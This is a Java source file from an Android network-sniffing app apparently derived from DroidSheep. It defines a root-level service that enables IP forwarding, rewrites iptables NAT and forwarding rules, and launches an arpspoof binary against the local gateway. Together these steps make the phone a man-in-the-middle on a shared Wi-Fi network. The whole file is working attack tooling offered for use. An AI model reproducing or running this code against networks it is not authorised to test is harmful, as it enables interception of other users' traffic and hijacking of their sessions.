/*
 * The arpspoof package containts Software, initially developed by Robbie
 * Clemons, It has been used, changed and published in DroidSheep according the
 * GNU GPL
 * Changed by Andreas Koch according the GPL in August 2011
 */

/*
 * ArpspoofService.java implements the background service that controls running
 * the native binary Copyright (C) 2011 Robbie Clemons <robclemons@gmail.com>
 * 
 * This program is free software; you can redistribute it and/or modify it under
 * the terms of the GNU General Public License as published by the Free Software
 * Foundation; either version 2 of the License, or (at your option) any later
 * version.
 * 
 * This program is distributed in the hope that it will be useful, but WITHOUT
 * ANY WARRANTY; without even the implied warranty of MERCHANTABILITY or FITNESS
 * FOR A PARTICULAR PURPOSE. See the GNU General Public License for more
 * details.
 * 
 * You should have received a copy of the GNU General Public License along with
 * this program; if not, write to the Free Software Foundation, Inc., 51
 * Franklin Street, Fifth Floor, Boston, MA 02110-1301 USA.
 */

package com.evozi.droidsniff.services;

import java.io.IOException;

import com.evozi.droidsniff.activities.ListenActivity;
import com.evozi.droidsniff.arpspoof.ExecuteCommand;
import com.evozi.droidsniff.helper.Constants;
import com.evozi.droidsniff.helper.SystemHelper;


import android.app.IntentService;
import android.content.Context;
import android.content.Intent;
import android.net.wifi.WifiManager;
import android.os.Bundle;
import android.os.PowerManager;
import android.util.Log;

public class ArpspoofService extends IntentService {

	private final 			String IPV4_FILEPATH = "/proc/sys/net/ipv4/ip_forward";
	
	private final 			String IPTABLES_CLEAR_NAT 	= "iptables -t nat -F";
	private final 			String IPTABLES_CLEAR		= "iptables -F";
	private final 			String IPTABLES_POSTROUTE   = "iptables -t nat -I POSTROUTING -s 0/0 -j MASQUERADE";
	private final 			String IPTABLES_ACCEPT_ALL  = "iptables -P FORWARD ACCEPT";
	
	private static final 	String TAG = "ArpspoofService";
	private volatile 		Thread myThread;
	private static volatile WifiManager.WifiLock wifiLock;
	private static volatile PowerManager.WakeLock wakeLock;
	protected static volatile boolean isSpoofing = false;

	public ArpspoofService() {
		super("ArpspoofService");
	}

	@Override
	public void onHandleIntent(Intent intent) {
		Bundle bundle = intent.getExtras();
		String localBin = bundle.getString("localBin");
		String gateway = bundle.getString("gateway");
		String wifiInterface = bundle.getString("interface");
		
		final String command = localBin + " -s 1 -i " + wifiInterface + " " + gateway;
		
		SystemHelper.execSUCommand("chmod 777 " + SystemHelper.getARPSpoofBinaryPath(this), ListenActivity.debugging);
		SystemHelper.execSUCommand("echo 1 > " + IPV4_FILEPATH, ListenActivity.debugging);
		
		SystemHelper.execSUCommand(IPTABLES_CLEAR, 		ListenActivity.debugging);
		SystemHelper.execSUCommand(IPTABLES_CLEAR_NAT, 	ListenActivity.debugging);
		SystemHelper.execSUCommand(IPTABLES_POSTROUTE, 	ListenActivity.debugging);
		SystemHelper.execSUCommand(IPTABLES_ACCEPT_ALL, ListenActivity.debugging);

		PowerManager pm = (PowerManager) getSystemService(Context.POWER_SERVICE);
		WifiManager wm = (WifiManager) getSystemService(Context.WIFI_SERVICE);
		wifiLock = wm.createWifiLock(WifiManager.WIFI_MODE_FULL, "wifiLock");
		wakeLock = pm.newWakeLock(PowerManager.PARTIAL_WAKE_LOCK, "wakeLock");
		wifiLock.acquire();
		wakeLock.acquire();
		try {
			myThread = new ExecuteCommand(command, false);
			myThread.setDaemon(true);
			myThread.start();
			myThread.join();
		} catch (IOException e) {
			Log.e(TAG, "error initializing arpspoof command", e);
		} catch (InterruptedException e) {
			Log.i(TAG, "Spoofing was interrupted", e);
		} finally {
			if (myThread != null)
				myThread = null;
			if (wifiLock.isHeld()) {
				wifiLock.release();
			}
			if (wakeLock.isHeld()) {
				wakeLock.release();
			}
			stopForeground(true);
		}
	}

	@Override
	public void onDestroy() {
		Thread killAll;
		try {
			killAll = new ExecuteCommand("killall arpspoof", false);
			killAll.setDaemon(true);
			killAll.start();
			killAll.join();
		} catch (IOException e) {
			Log.w(TAG, "error initializing killall arpspoof command", e);
		} catch (InterruptedException e) {
			// don't care
		}

		if(myThread != null) {
			myThread.interrupt();
			myThread = null;
		}
		wifiLock.release();
		wakeLock.release();
		stopForeground(true);
		isSpoofing = false;
		/**
		//at the suggestion of the internet
		if (myThread != null) {
			Thread tmpThread = myThread;
			myThread = null;
			tmpThread.interrupt();
		}
		**/
		SystemHelper.execSUCommand(Constants.CLEANUP_COMMAND_ARPSPOOF, ListenActivity.debugging);
//		SystemHelper.execSUCommand("echo 0 > " + IPV4_FILEPATH, ListenActivity.debugging);
	}
}